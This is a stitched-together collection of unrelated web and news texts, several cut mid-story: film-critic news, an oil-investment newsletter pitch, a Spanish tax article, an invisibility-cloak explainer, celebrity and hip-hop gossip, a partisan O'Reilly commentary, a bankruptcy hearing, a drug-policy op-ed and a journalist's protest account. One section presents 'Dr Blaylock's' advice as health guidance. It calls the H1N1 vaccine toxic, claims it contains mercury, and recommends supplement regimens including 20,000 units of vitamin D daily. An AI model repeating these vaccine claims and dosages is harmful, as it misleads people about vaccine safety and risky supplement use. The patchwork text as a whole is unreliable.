Mankiewicz would escape much of the criticism directed at the revamped " At the Movies , " most of which targeted Lyons , whose inability to articulate his opinions undercut his cinematic knowledge and critical skills .
Too often Lyons sounded as though he were dictating a blurb for an ad , rather than giving serious counsel as to whether a consumer should buy a ticket , rent a DVD or skip a film altogether .
“ We tried something new last season and we think the world of Ben Lyons and Ben Mankiewicz , " Frons said .
" They did everything we asked of them and they have been complete professionals .
However , we ’ve decided to return the show to its original essence – two traditional film critics discussing current motion picture and DVD releases .
We thank them for their hard work and dedication this past year and wish them nothing but the best on all of their future endeavors . ”
Phillips has been the Chicago Tribune 's film critic since 2006 .
He has written about entertainment and the arts for the Los Angeles Times , San Diego Union - Tribune , St. Paul Pioneer Press , Dallas Times - Herald and the Twin Cities weekly City Pages , and also covered movies for Minnesota Public Radio , WGN - AM and MSNBC .
" I can't wait to mix it up with Tony , who 's one of the sharpest critical voices in the nation , " Phillips said .
" To co-host a show with such an extraordinary legacy is a privilege and an opportunity .
I know we 're both humbled by that legacy , and we 're eager to get people thinking -- really thinking -- about movies and to guide cinema lovers in the right direction .
And perhaps some unexpected directions . "
Scott has been a film critic at the New York Times for nearly 10 years and been a frequent guest on PBS ' " Charlie Rose , " NPR ’s " Talk of the Nation " and other radio and television programs .
Before joining the Times , Scott was the Sunday book critic at Newsday and a freelance contributor to dozens of publications , including the New Yorker , Wall Street Journal and The New York Review of Books and Slate .
“ I ’m overjoyed and honored to be joining ' At the Movies , ' and especially excited to be working with my colleague Michael Phillips , one of the most intelligent and wittiest critics around , ” Scott said in the announcement .
“ This show , with its long history and rich tradition , stands for the idea that there is a place on television for vigorous argument and independent thinking about movies . ”
Phillips , 48 , and Scott , 43 , have the respect of readers and their peers , but whether the new team enjoys the same kind of chemistry that Ebert shared with Siskel and Roeper and can engage in the show 's old brand of lively give - and - take will be among the challenges in regaining the show 's standing .
" I have the highest regard for both Michael Phillips and Tony Scott , " Ebert said by e-mail .
Siskel and Ebert were anything but polished themselves when they made their WTTW debut , but that may have been part of their charm .
The pair went national on public TV in 1978 , moved to commercial syndication with Chicago Tribune parent Tribune Co. in 1982 and then to Disney in 1986 .
Siskel died in 1999 and Roeper was named his successor the following year .
Ebert had to leave the program in 2006 because of health issues that have robbed him of his voice , but his name and imprimatur remained with the program until the split with Disney last summer .
A sign of trouble had surfaced a few months earlier as the show dropped its use of " thumbs up " and " thumbs down " as shorthand for a recommendation or rejection of a film .
Ebert and Siskel 's estate owned the trademark on the thumbs .
" At the Movies " will continue to employ the “ see it , ” “ skip it , ” or “ rent it ” ratings system it adopted at that time .
“ I loved working on this show , every moment of it , ” Mankiewicz said through Disney .
“ It was an honor to continue a broadcast legacy not merely started by Roger Ebert and Gene Siskel , but created by them .
No doubt the show is in good hands . "
There 's one thing that gives me pause on my way to work .
. .
Sitting across the street is a building that has captured my attention each and every morning for the last three years .
And no matter what kind of hurry I 'm in , I absolutely have to take a moment to stop and admire it .
Built back in the 1940s , it 's a landmark for anyone in the area .
You can instantly tell it was made with care .
From a distance it looks like a massive castle , turrets and all .
But as you get closer , you can see how well every nook and cranny was delicately carved out with purpose .
The detail is simply amazing .
And although I find some new aspect to admire whenever I walk by , I 've never had the opportunity to go inside it .
. . until today .
I found myself in a similar situation when I stopped to look at it early this morning .
The dark clouds were n't enough of a warning , and a torrential downpour came down in a heartbeat .
I quickly took refuge from the rain at the entrance and came face - to - face with the building 's doorman .
Not wanting to waste an opportunity to ask , finally , whether the interior was just as stunning , I struck up a conversation with him .
Looking back , I wish I had n't asked .
According to him , the building has deteriorated quite a bit .
The plumbing was a disaster , and there was always something wrong with the pipes .
For him , it felt like the walls were crumbling .
During the last few years , the price to repair everything has been extremely costly .
No matter what they replace , something else falls apart .
I think some of you will be able to see a striking similarity my building has with our oil industry .
. .
It 's not just the oil fields that are aging ; let 's not discount the growing number of rigs and miles of pipelines that need to be maintained .
Of course , the fact that oil prices have drastically fallen over the last 10 months does n't give me much comfort that those expensive ventures can even be afforded .
The times , dear reader , they are a -changing .
~~ad_0 ~~
Ten Billion Barrels Busted
When the IEA released their 2008 energy report , there were some disturbing facts that came out .
One problem , specifically , is how vital a handful of fields are to our global production .
Over a quarter of the world 's oil production came from just 20 giant oilfields .
Do n't forget that most of these fields are more than 50 years old and in decline .
Overall , a little more than one hundred fields make up half of the world 's total production ( the remaining production is made up of approximately 70,000 oilfields ) .
As production at those super giant fields wanes , we 're going to have to rely more on smaller fields to make up the difference .
One would conclude that it 's important to continue developing new areas for exploration .
Apparently that 's not the case .
Last week , a federal court of appeals tossed out the Department of the Interior 's 2007 - 2012 five - year oil and natural gas leasing plan , citing concern for the environmental impact .
My longtime readers might remember when I talked about the Department of Interior 's lease plan back in 2007 .
As I recall , they expected their plan to generate $ 170 billion dollars from developing oil targets off the coasts of Alaska and the Gulf of Mexico .
Well , so much for that plan .
As you probably expected , the decision is being both hailed and condemned .
So let me ask you , " Do you think the move was justified ? "
Please feel free to let us know how you feel about the situation by leaving a comment below .
I do n't expect my readers to pull any punches on the court 's decision .
The Future of Offshore Drilling
What this does mean , however , is that preventing development in these offshore waters will have a detrimental affect on our future production .
Although the effect on longterm prices is still to be determined , I would n't expect it to sway current oil prices .
Actual production from these lease areas would n't have been pumped for several years .
There 's another reason I 'm not too worried .
As I just mentioned , offshore production is playing an increasingly important part in global production .
While the giant onshore fields age and decline , we 're going to have to drill further and deeper than ever before — simply to make up lost production .
Like the rest of the oil industry , lower oil prices have had an effect on the offshore drillers .
They certainly were n't spared the volatility .
At the height of $ 147 / bbl oil , day - rates for new contracts could reach up to half a million dollars .
We can also add fewer available contracts on top of the declining day - rates .
Here 's the thing .
. .
Even with the court 's decision to put the kibosh on the DOI 's offshore lease plan , I 'm still banking on the offshore drillers to pull through , especially over the next few years .
I 'm not suggesting you blindly throw your hard earned money at any company , praying you hit the big one .
I could just as easily torch my cash .
As I 've said to my readers before , hopes and dreams do n't pay the bills .
Instead , I would focus my attention on which of those offshore companies have a strong fleet under contract .
How much of their drilling fleet is sitting idle ?
Which ones have a backlog of work ?
Do n't think for a second that there 's no money to be made in today 's markets .
For example , I know that most of my readers recently banked a solid 30 % gain from just one of these beaten down offshore drillers .
More importantly , however , is that they 're a few days away from making another move .
It 's not fair to my newer readers if I did n't offer you the same chance .
Maybe it 's time you joined their success .
Until next time ,

Los contribuyentes que han presentado su Declaración Anual correspondiente al 2019 , y que han resultado con saldo a favor , se han quejado de obtener una devolución parcial por parte del Servicio de Administración Tributaria ( SAT ) .
A través de redes sociales como Twitter y Facebook , las personas físicas han presentado la queja .
Algunos indican que sólo se les ha devuelto 20 % de su devolución .
Ante esta problemática , la Procuraduría de la Defensa del Contribuyente ( Prodecon ) informó que ya varios pagadores de impuestos se han acercado a ella para arreglar esta solución .
Gloria Franco , directora general de Orientación y Asesoría del Contribuyente de la Prodecon , explicó que esto se ha dado cuando los contribuyentes modifican la información de ingresos y deducciones al momento de realizar su declaración , en vez de aceptar el prellenado propuesto por el fisco en su aplicación , por lo que ya se encuentran en pláticas con el SAT para solucionar este inconveniente .
“ El motivo es porque los contribuyentes modificaron sus ingresos o deducciones respecto a la declaración prellenada , por lo que al hacerlo a la autoridad no le coincide , por lo que el contribuyente puede presentar documentos para sustentar la deducción y hacer la devolución manual ” , explicó .
Las personas físicas tienen hasta el 30 de abril para presentar su declaración anual , en donde presentan al fisco su balance de ingresos y gastos del año fiscal , así como las deducciones personales que pueden resultar en un saldo a favor .
Una de las ventajas de hacer la declaración anual , además de cumplir con la obligación fiscal , es que una vez realizada se puede obtener un saldo a favor , el cual será devuelto al contribuyente en su cuenta bancaria .
De acuerdo con el órgano recaudador , las personas físicas pueden deducir gastos médicos , funerarios , donativos , primas de seguros de gastos médicos , transporte escolar , aportaciones complementarias para el retiro , cuentas personales de ahorro para el retiro , colegiaturas e intereses reales .
La ley estipula que las personas físicas pueden deducir hasta 147,014 pesos o bien , hasta 15 % de su salario , dependiendo cual sea menor .
La devolución puede tardar entre cinco y 40 días hábiles .
Otras quejas
Gloria Franco refirió que , desde el inicio del mes , los contribuyentes se acercaron a la Prodecon por diferentes quejas para presentar su declaración anual , como un mal funcionamiento de la página , algo que quedó arreglado el mismo día que se reportó .
No obstante , hay otras quejas en la parte de la devolución de saldos a favor , ya que varios contribuyentes aún no ven reflejado el estatus de su devolución , es decir , no aparece si está en proceso , ha sido aprobada o rechazada .
“ Tenemos contribuyentes que presentaron su declaración el 1 de abril y todavía no existe ningún estatus en su devolución .
Los estamos apoyando para ver cómo avanza el proceso ” .
En los últimos días , añadió , se han encontrado inconsistencias en la CLABE interbancaria por lo que el SAT busca la manera de que ésta pueda ser sustituida .
¿ Cómo presentar la Declaración Anual 2019 ?
El primer paso es ingresar al portal del SAT con el RFC y la contrase ña asignada .
Al ingresar , se le solicitarán algunos datos y deberá corroborar , en caso de tener una declaración prellenada , que los ingresos y deducciones sean acorde a lo que tiene registrado .
Después de confirmar que todo esté bien , se firma la declaración con la e.firma o contrase ña
Para finalizar el trámite , se da un acuse con el número de la operación , la fecha y un sello digital .

What if you could simply throw on a cloak and disappear from sight ?

Admit it .
You 'd love to own an invisibility cloak .
Utter an embarrassing faux pas at a party ?
Just throw on your magical garment and vanish from the snooty gaze of your fellow partygoers .
Want to hear what your boss is really saying about you ?
Stroll right into his or her office and get the goods .
Such fantastic fashion accessories have become ridiculously standard in the world of science fiction and fantasy .
Everyone , from boy wizards to intergalactic safari hunters , has at least one invisible blouse in their wardrobe , but what about us poor saps in the real world ?

Well , Muggles , science has some good news for you : Invisibility cloaks are a reality .
The technology is far from perfect , but if you 'll step into our high - tech boutique of vanishing apparel , we 'll guide you through your invisibility cloak options .
First up , we 'll look at some wonderful carbon nanotube fashions -- fresh from the UTD NanoTech Institute fall 2011 collection .
This new technology is inspired by the same natural phenomena responsible for desert mirages .
Heated via electrical stimulation , the sharp temperature gradient between the cloak and the surrounding area causes a steep temperature gradient that bends light away from the wearer .
The catch : Wearers must love water and be able to fit inside a petri dish .
Or perhaps you 'd prefer something made from metamaterials .
These tiny structures are smaller than the wavelength of light .
If properly constructed , they guide rays of light around an object -- much like a rock diverting water in a stream .
For now , however , the technology only works in two dimensions and only comes in the ultrapetite size of 10 micrometers across .
If you 're more into retro fashion , there 's also the optical camouflage technology developed by scientists at the University of Tokyo .
This approach works on the same principles of the blue screen used by TV weather forecasters and Hollywood filmmakers .
If you want people to see through you , then why not just film what 's behind you and project it onto your body ?
If you travel with an entourage of videographers , this may be the cloak for you .
Ready to try some of these fashions on for size ?

Gay Torchwood star John Barrowman has revealed his anger at being told by his bosses he should keep his sexuality a secret .
In his autobiography I Am What I Am , published today , he said he was warned early in his career he should pretend to be straight in order to achieve success .
Barrowman claimed a gay producer was sent by his bosses to give him the warning .
He claimed the producer said : “ John , we wondered if you really wanted to reveal that you ’re gay ?
We think it might change how people feel about you . ”
The actor said he replied “ I really hope you ’re not saying this , because I ’m not going in the closet for you or anyone .
You ’ve hired me to be a professional , not to have sex .
Being a gay man has nothing to do with my abilities on this show . ”
Remembering the exchange , Barrowman said : “ The incident was even more offensive because they sent a gay producer to discuss this with me , as if somehow this would ease the blow . ”
He has not identified which production company told him to stay in the closet but according to The Times , he has worked for the BBC , ITV and Five as well as the American networks CBS and NBC .
All have denied telling him to keep quiet .
Barrowman said he had received an apology over the incident but added : “ One of my explicit missions as an entertainer is to work to create a world where no one will ever make a statement like this producer did to me to anyone who ’s gay . ”
Lis Wiehl tries to explain the Commerce Clause to O'Reilly on The Factor last night because the new talking point of the health care insurance companies ...
Republicans ... FOX News ... BillO the teabagger is just that , but he can't handle the truth , dammit .
Bill , it 's not lawyers that are the problem just because Wiehl interpreted it the way you hate .
It 's this idiot op ed by two people that worked for Bush and Reagan that are saying individual mandates are unconstitutional and causing the real " nuts " to go off the deep end .
And you can be sure that the rest of the right wing loons will be jumping aboard the crazy train with him .
Wiehl : Article one in the Constitution says the Congress has the power to regulate interstate commerce .
That is anything that goes from one state to another .
O'Reilly : So what ?
Wiehl : Health care itself may be local , your doctor may be in your state but medical supplies come to you the medical equipment , all of the things ...
O'Reilly :
Why can they make you buy anything ?
Wiehl : Because they can regulate interstate commerce .
Those things go through interstate , they can force you to ...
O'Reilly : OK , I want the audience to know that this is total BS .
This is why people hate lawyers , this is nuts .

The government is saying you have to buy health insurance .
You have to do it .
I 'm saying that 's unconstitutional .
The federal government does n't have the power to force an American to buy anything .
The Supreme Court over the years has used this Clause on many , many rulings .
We had to buy George W Bush , Bill .
Oh , you liked him --- never mind .
That was a different clause .

01 of 13 The 12 Most Embarrassing Moments in Hip - Hop History ( Photo by Neilson Barnard / Getty Images )
A few years back , tough - guy rapper Rick Ross was found to be a former correctional officer .
Now , there 's nothing wrong with being a CO .
Well , unless you happen to be a rapper who built his career on tales about moving weight in the hood .
Rick Ross denied it at first , but later copped to his old profession .
Ross is n't the only rapper who 's had to lick his wounds in public .
Rappers , big and small , have had a few embarrassing moments they hope would remain hidden .
Unfortunately for them , they rarely have the privilege of being able to deal with embarrassing moments in private like the rest of us .
Here 's a rundown of the 12 most embarrassing hip - hop moments .
02 of 13 Eve's Dirty Secret Pastor Ma$e once ran into Eve at a strip club , years before she became famous .
Ma$ never mentioned it to anyone .
Years later , some internet jerk unearthed pictures of Eve from her stripping days .
In 2003 , just as Eve was in the middle of revamping her image as an artist / actress , unflattering pics of her in full - on stripper outfit surfaced on the web to the amusement of many .
Some of the photos showed the Ruff Ryders ' first lady in a compromising position with another dancer .
She later claimed that the other lady had been Photoshopped onto the original picture .
Well , there was nothing doctored about the sex tape that turned up a couple years after , co-starring former Bad Boy producer Stevie J .

At the height of the Eazy - E vs Dr. Dre beef in 1992 , the feuding friends traded insults non-stop .
Just when you thought Dre had won the battle with " Dre 's Day , " Eazy - E bounced back with " Real Muthaf - - kin ' Gs . "
Eazy attacked Dre and Snoop , calling them studio gangsters who had never really witnessed the harsh realities of the hood , but that was n't the highlight of the diss .
He devoted plenty of airtime to Dre 's past as a member of the electro - pop group World Class Wrecking Cru ' .
" Damn it ’s a trip how a n--- a can go so quick from wearing lipstick to smoking on chronic at picnics , " he rapped .
Eazy also threw in a promo pic of Dre from 1986 dressed in pumps and mascara to boot .
04 of 13 The Rap Bible 's Fall from Grace Eminem Source Cover .
When pioneering hip - hop magazine The Source went bankrupt , the last thing the Board of Directors expected to hear was , " Um...sorry , Ray spent all the money on weed and bling bling . "
Like a 7 - headed dragon , their problems multiplied and attacked from various angles .
A Manhattan lithographer sued for $ 30,000 .
A 5th Ave. jeweler petitioned for a $ 36,000 dent .
The magazine 's travel agent was owed $ 142,000 .
Former Editor - in - Chief Kim Osorio filed a sexual harassment lawsuit .
Osorio's description of The Source work environment sounded like something straight out of a movie : a " raunched - out workplace where executives watched porn , smoked pot and called female employees b*tches . "

On June 22nd , 2015 , just a day after Father ’s Day , Diddy embarrassed himself at his son ’s training facility .
Diddy was arrested after allegedly confronting a UCLA assistant coach .
Diddy , whose son Justin Combs plays defensive back for the Bruins , was possibly upset at his son's lack of playing time .
Diddy was arrested on three counts of assault with a deadly weapon , the deadly weapon being a kettlebell .
( Wait , Diddy can lift a kettlebell ? )
He was also charged with one count of making terrorist threats and one count of battery .
06 of 13 Akon 's Squeaky Clean Past Akon always touted his past reputation as the ring leader of a notorious car theft clique .
He claims to have been locked up for 3 1/2 years .
He even rode his way to fame on the strength of a catchy single titled " Locked Up , " in which ' Kon gave a supposedly autobiographical account of prison desolation .
In fact , Akon was so obsessed with his felonious past that he named his label Konvict Music .
That sound you hear at the beginning of every song he produces ?
That 's the sound of a clanking cell door .
A Smoking Gun investigation later revealed some inconsistencies between Akon 's story and official documents .
Turns out that the man who titled his sophomore LP Konvicted has never served jail time .

In a desperate attempt to paint Eminem as a racist , The Source founders Benzino and Dave Mays emerged with a tape that caught a 17 - year old Marshall Mathers using the N - word .
On one of the songs from the 1988 tape , an amateurish Eminem spewed hateful venom at black women : " All the girls I like to bone have big butts / No they do n't , ' cause I do n't like that n****r shit / I 'm just here to make a bigger hit . "
Eminem explained that he wrote the song out of anger , having gone through a nasty break - up with his black girlfriend .
He apologized and detailed the entire saga on " Yellow Brick Road , " one of his best songs ever .
08 of 13 Young Buck 's Emotional Breakdown Michael Loccisano / FilmMagic / Getty Images
No one will forget the time 50 Cent publicly gave Young Buck the boot .
Before being unceremoniously dismissed from 50's G - Unit crew in 2008 , Young Buck spent some time airing the group 's dirty laundry .
In a bid to build consensus among his fanbase , the Tennessee rapper claimed that 50 owed him unpaid royalties and that he was getting screwed in his deal .
Buck quickly forgot that 50 Cent is the King of Controversy .
To build buzz for G - Unit 's T.O.S. album , 50 unveiled an old phone conversation with Buck .
Throughout the call , Young Buck admits that he owes 50 Cent a ton of money .
He even goes on to tell his former boss about his own financial plight .
At some point , he breaks down over his dismissal from the Unit , " Sh*t got me confused , man , " he 's heard saying repeatedly , amid choked up tears .
To which 50 Cent coyly replied , " You 'll be alright , do n't worry about it . "
Of course , Buck had no idea he was being recorded .
50 , you sneaky bastid .

In what may have been the longest elevator ride ever , Solange opened a can of whoop - ass on brother - in - law Jay Z .
In the security camera footage leaked days later , Solange is seen yelling , kicking and spitting at Hov , while Beyonce watches .
The karate chops continue until a bodyguard finally intervenes .
A week later , the familiy made nice and released a statement saying that " families have problems and we 're no different . "

10 of 13 Vanilla Lies , Lies , Baby
For a while in 1990 or thereabout , everyone on the planet was combing through Vanilla Ice 's past to see they could find any skeletons in his closet .
Ice planted doubts in the minds of his followers by repeatedly portraying an image of a tough guy .
He told the media that he was raised in the mean streets of Miami .
Worse ,
Ice gave three different accounts of an incident , in which he claimed he had been stabbed five times and lost half of his blood .
It was later discovered that the tough - talking Vanilla Ice was full of lies .
The man born Robert van Winkle actually spent most of his teenage life in an affluent Dallas suburb .
His stories about attending an all - black Florida high school and living a rugged life of crime were all found to be tall tales .
11 of 13 Cam'ron's No Snitching Campaign Bennett Raglin/ BET / Getty Images During a 2007 appearance on 60 Minutes to discuss the role of snitching in urban communities , Anderson Cooper asked Cam 'ron a simple question :
What would you do if you knew that a serial killer lived next door ?
Cam 's response defied reasoning .
It ignored common sense : " If I knew a serial killer was living next door to me ?
I would n't call and tell anybody on him .
But I 'd probably move .
I 'm not going to call and be like , ' The serial killer 's in 4E . ' "
Cam went on to say that snitching was in strict violation of his code of ethics -- that he would never condone it .
After a Smoking Gun article showed documents proving that Cam had actually violated his own code in the past .
Police reports showed Cam cooperated with authorities during a criminal investigation in 1997 .
The Harlem rapper quickly found himself singing from a different hymn book .
To his credit , Cam apologized for the earlier statement .
Under preliminary questioning by one of the bank ’s lawyers , Mr. Ohayon stated that Mrs. Giguere had repeatedly failed to provide a financial worksheet , a critical document in processing a loan modification .
Under cross-examination by Mrs. Giguere ( who had a little assistance from Judge Haines ) , the bank ’s defense withered .
From her files , Mrs. Giguere produced a letter from Wells Fargo describing the paperwork that she needed to file for a loan modification .
In the witness chair , Mr. Ohayon read the letter .
“ Mrs. Giguere is right , ” Mr. Ohayon concluded .
“ The letter did not ask for a financial worksheet . ”
Experts said the hearing in Phoenix reflected rising frustration by federal bankruptcy judges with mortgage servicers , which process payments for banks and the investors who own large pools of loans .
In recent months , judges in Ohio and Pennsylvania have chastened mortgage servicers for failing to process payments properly and for errors in foreclosure filings , among other concerns .
“ The judges are seeing more and more of a pattern of indifference to record - keeping and good business practices , ” said Robert Lawless , a law professor at the University of Illinois who specializes in bankruptcy law .
One of the biggest complaints by homeowners has been poor communication by mortgage servicers on the status of their applications for loan modifications .
In the case of Mrs. Giguere , Wells Fargo decided back in March shortly after she faxed the bank her application that she did not qualify for the Home Affordable Modification Program .
She did not learn of the bank ’s decision until Thursday .
“ When did you tell the debtors that their loan was no longer being considered for modification ? ” Judge Haines asked Mr. Ohayon .

“ We have n’t .
They ’ve never been told , ” said Mr. Ohayon , adding : “ Customer communication is something we ’re taking a serious look at , your honor . ”
It is time to admit the obvious .
The " war on drugs " has failed , at least in the way it has been waged so far .
In Latin America , the " unintended " consequences have been disastrous .
Thousands of people have lost their lives in drug - associated violence .
Drug lords have taken over entire communities .
Misery has spread .
Corruption is undermining fragile democracies .
And , after decades of over - flights , interdictions , spraying and raids on jungle drug factories , Latin America remains the world 's largest exporter of cocaine and marijuana .
It is producing more and more opium and heroin .
It is developing the capacity to mass - produce synthetic drugs .
Continuing the drugs war with more of the same is ludicrous .
What is needed is a serious debate that will lead to the adoption of more humane and more effective strategies to deal with the global drug problem .
Earlier this year the Latin American Commission on Drugs and Democracy , which I co-chaired with the former president of Colombia , César Gaviria , and the former president of Mexico , Ernesto Zedillo , released the first high - level statement ever to endorse harm - reduction generally and decriminalisation of marijuana specifically .
The core conclusion of the statement is that a paradigm shift is required away from repression of drug users and towards treatment and prevention .
The challenge is to reduce drastically the harm caused by illegal narcotics to people , societies and public institutions .
To move in this direction , it is essential to differentiate between illicit substances according to the harm they inflict .
The status of addicts must change from that of drug buyers in the illegal market to that of patients cared for in the public health system .
Police activities can then be better focused against the drug lords and organised crime .
The shift towards harm - reduction efforts and decriminalisation has already begun .
Recently , a landmark ruling by Argentina 's supreme court and a law passed by Mexico's Congress have for all practical purposes removed criminal penalties in those countries for the possession of small amounts of drugs for personal and immediate consumption .
Colombia was the first country to take this step .
A decision by its constitutional court in 1994 scrapped penalties for private consumption .
Bolivia and Ecuador have liberalised their drug laws .
Change is also imminent in Brazil .
The chief justice of our highest court made a public appeal for clarification of the differentiation between drug user and drug dealer .
A current ambiguity in the law effectively opens opportunities for police corruption and extortion .
Brazil 's legislature is about to consider a new law to remove penalties for the consumption of small amounts of marijuana .
This is consistent with the broader trend in Europe : the Netherlands decriminalised years ago ; Portugal followed in 2001 , stressing that criminalisation drove resources away from treatment and deterred people from seeking help for addiction – the number of people using drugs before decriminalisation was higher than afterwards .
In the United States , backing for decriminalisation and treatment alternatives to prison is growing , but has still not achieved a critical mass of support and momentum behind traditional – failed – punitive policies remains strong .
There is still a long way to go .
The trend towards decriminalisation for possession helps to empower a public health paradigm .
It breaks the silence about the drug problem .
It enables people to think in terms of approaching drug abuse in a way that is not first and foremost a matter for the criminal justice system .
Reducing the harm caused by drugs goes hand in hand with reducing consumption .
Repressive policies towards drug users are firmly rooted in prejudice , fear and ideological visions , rather than in cold and hard assessment of the realities of drug abuse .
The approach recommended in the commission 's statement does not imply complacency regarding narcotics and their purveyors .
Abuse of drugs is harmful to health .
Abused drugs undermine a user 's decision - making capacity .
Needle - sharing spreads HIV / Aids and other diseases .
Addiction can lead to financial ruin and abuse of family , especially children .
To be credible and effective , decriminalisation must be combined with robust prevention campaigns .
The profound drop in tobacco consumption in recent decades shows how public information and prevention campaigns can be effective when they are based on messages that are consistent with the experience of those they target .
No country has devised a comprehensive solution to the drug abuse challenge .
And a solution need not be a stark choice between prohibition and legalisation .
Alternative approaches are being tested and must be carefully reviewed .
But it is clear that the way forward will involve a strategy of reaching out , patiently and persistently , to the users , and not the continued waging of a misguided and counterproductive war that makes the users , rather than the drug lords , the primary victims .

Dr Blaylock 's List of suggestions on How to Reduce the Toxic Effects of the A / H1N1 Vaccine , is as follows : 1 . Number one on the list says Dr Blaylock , is to bring a cold pack with you and place it on the site of the injection as soon as you can , as this will block the immune reaction .
Once you get home , continue using a cold pack throughout the day .
If you continue to have immune reactions the following day , have cold showers and continue with the cold press .
2 . Take fish oil .
Eicosapentaenoic acid ( EPA ) , one of the omega 3 fatty acids found in fish oil supplements , is a potent immune suppressant .
If you take high dose EPA you will be more susceptible to infections , because it is a powerful immune suppressant .
However , in the case of an immune adjuvant reaction , you want to reduce it .
Studies show that if you take EPA oil one hour before injecting a very powerful adjuvant called lipopolysaccharide ( LPS ) , it would completely block the ability of the LPS to cause brain inflammation .
Take a moderate dose everyday and more if needed to tame a cytokine storm .
3 . < http://lpi.oregonstate.edu/f-w00/flavonoid.html>Flavonoids are third on the list , namely curcumin , quercetin , ferulic acid and ellagic acid , particularly in a mixture .
The curcumin and quercetin in particular have been found to block the ability of the adjuvants to trigger a long - term immune reaction .
If you take it an hour before the vaccination , it should help dampen the immune reactions says Dr Blaylock .
4 . Vitamin E , the natural form that is high in gamma-E will help dampen the immune reactions and reduces several of the inflammatory cytokines .
5 . An important ingredient on the list is Vitamin C at a dose of 1000 mg , taken four times a day between meals .
It is a very potent anti-inflammatory and should be taken in a buffered form , not as absorbic acid , says Dr Blaylock .
6 . < http://www.naturalnews.com/002156.html>
Also use astaxanthin as it's an anti-inflammatory .
According to Dr Blaylock , fatal reactions to vaccines in aboriginal and African children occurred in those who were deficient in carotinoids , like astaxanthin .
It is a good protection against the toxic effects of the vaccine .
7 . Likewise , it was found that children who were deficient in zinc had a high mortality rate .
Zinc is very protective against vaccine toxicity .
( Do not use zinc mixed with copper however , as copper is a major trigger of free - radical generation according to Dr Blaylock ) .
8 . Ensure you avoid all immune - stimulating supplements , such as mushroom extracts , whey protein and < http://www.betaglucan.org/>beta-glucan.
9 . Take a multivitamin - mineral daily ­ one that does not contain iron .
This multivitamin - mineral is to make sure your body has plenty of B vitamins and selenium .
Selenium , said Dr Blaylock , is very important for fighting viral infections and it reduces the inflammatory response to vaccines .
10 .
Magnesium citrate / malate 500 mg of elemental magnesium two capsules , three times a day .
( This was not mentioned during the show , but was posted at Dr Deagle 's website , < http://www.clayandiron.com/news.jhtml?method=view&news.id=2103>ClayandIron.com).
11 . What is very important is vitamin D3 , which is the only ' vitamin ' the body can manufacture from sunlight ( UVB ) .
It is a neural hormone , not really a vitamin says Dr Blaylock and helps if you are over - reacting immunologically by cooling down the reaction .
Similarly , if you are under - reacting , it helps to boost your immune response .
In addition it also protects against microorganism invasion .
Black people and those in colder climates are particularly deficient , so they will almost certainly require supplementation .
Dr Blaylock recommends that following vaccination it will help to keep the immune reaction under control if : i )
All children get 5,000 units a day for two weeks after the vaccine and then 2,000 a units a day thereafter ; ii ) Adults get 20,000 units a day after the vaccine for two weeks , then 10,000 units a day thereafter ; iii )
And with that adults should take 500 - 1000 mg of calcium a day and children under the age of 12 years should take 250 mg a day , as vitamin D works more efficiently in the presence of calcium .
12 . Ensure you avoid all mercury - containing seafood or any other sources of mercury , as the heavy metal is a very powerful inducer of autoimmunity , is known to make people more susceptible to viral infections and will be in H1N1 vaccines .
13 .
Avoid the oils that significantly suppress immunity and increase inflammation - such as corn , safflower , sunflower , soybean , canola and peanut oils .
14 . Drink very concentrated white tea at least four times a day .
It helps to prevent abnormal immune reactions .
15 .
Pop parsley and celery in a blender and drink 8 ounces of this mixture twice a day .
Dr Blaylock says the parsley is very high in a flavonoid called apigenin and that celery is high in < http://www.dietaryfiberfood.com/antioxidants/flavonoid-antioxidant.php>luteolin.
Both are very potent in inhibiting autoimmune diseases , particularly the apigenin , so go and plant some parsley in your garden now .
The ABC's Middle East correspondent Anne Barker became caught in violent street protests involving ultra-Orthodox Jews in Jerusalem at the weekend .
This is her graphic account of her ordeal .
As a journalist I 've covered more than my share of protests .
Political protests in Canberra .
Unions protesting for better conditions .
Angry , loud protests against governments , or against perceived abuses of human rights .
I 've been at violent rallies in East Timor .
I 've had rocks and metal darts thrown my way .
I 've come up against riot police .
But I have to admit no protest - indeed no story in my career - has distressed me in the way I was distressed at a protest in Jerusalem on Saturday involving several hundred ultra-Orthodox Jews .
This particular protest has been going on for weeks .
Orthodox Jews are angry at the local council 's decision to open a municipal carpark on Saturdays - or Shabbat , the day of rest for Jews .
It 's a day when Jews are not supposed to do anything resembling work , which can include something as simple as flicking a switch , turning on a light or driving .
So even opening a simple carpark to accommodate the increasing number of tourists visiting Jerusalem 's Old City is highly offensive to Orthodox Jews because it 's seen as a desecration of the Shabbat , by encouraging people to drive .
I was aware that earlier protests had erupted into violence on previous weekends - Orthodox Jews throwing rocks at police , or setting rubbish bins alight , even throwing dirty nappies or rotting rubbish at anyone they perceive to be desecrating the Shabbat .
But I never expected their anger would be directed at me .
I was mindful I would need to dress conservatively and keep out of harm 's way .
But I made my mistake when I parked the car and started walking towards the protest , not fully sure which street was which .
By the time I realised I 'd come up the wrong street it was too late .
I suddenly found myself in the thick of the protest - in the midst of hundreds of ultra-Orthodox Jews in their long coats and sable - fur hats .
They might be supremely religious , but their behaviour - to me - was far from charitable or benevolent .
As the protest became noisier and the crowd began yelling , I took my recorder and microphone out of my bag to record the sound .
Suddenly the crowd turned on me , screaming in my face .
Dozens of angry men began spitting on me .
Spit like rain
I found myself herded against a brick wall as they kept on spitting - on my face , my hair , my clothes , my arms .
It was like rain , coming at me from all directions - hitting my recorder , my bag , my shoes , even my glasses .
Big gobs of spit landed on me like heavy raindrops .
I could even smell it as it fell on my face .
Somewhere behind me - I did n't see him - a man on a stairway either kicked me in the head or knocked something heavy against me .
I was n't even sure why the mob was angry with me .
Was it because I was a journalist ?
Or a woman ?
Because I was n't Jewish in an Orthodox area ?
Was I not dressed conservatively enough ?
In fact , I was later told , it was because using a tape - recorder is itself a desecration of the Shabbat even though I 'm not Jewish and do n't observe the Sabbath .
It was lucky that I do n't speak Yiddish .
At least I was spared the knowledge of whatever filth they were screaming at me .
As I tried to get away I found myself up against the line of riot police blocking the crowd from going any further .
Reassurance
Israeli police in their flak jackets and helmets , with rifles and shields , were yelling just as loudly back at the protesting crowd .
I found them something of a reassurance against the angry , spitting mob .
I was allowed through , away from the main protest , although there were still Orthodox Jews on the other side , some of whom also yelled at me , in English , to take my recorder away .
Normally I should have stayed on the sidelines to watch the protest develop .
But when you 've suffered the humiliation and degradation of being spat on so many times - and you 're covered in other people 's spit - it 's not easy to put it to the back of your mind and get on with the job .
I left down a side street and walked the long way back to the car , struggling to hold back the tears .
Editor 's note ( August 25 ) :
This report has been amended to make it clear the protesters were speaking Yiddish rather than Hebrew , as was originally reported .
